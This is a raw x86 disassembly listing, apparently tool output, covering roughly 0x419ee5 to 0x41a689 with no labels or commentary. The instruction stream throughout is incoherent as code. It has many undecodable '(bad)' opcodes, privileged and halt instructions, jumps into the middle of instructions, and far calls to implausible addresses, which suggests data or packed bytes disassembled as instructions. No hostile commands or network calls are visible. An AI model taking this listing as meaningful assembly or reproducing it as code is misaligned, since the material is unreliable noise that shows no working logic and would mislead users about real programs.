  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
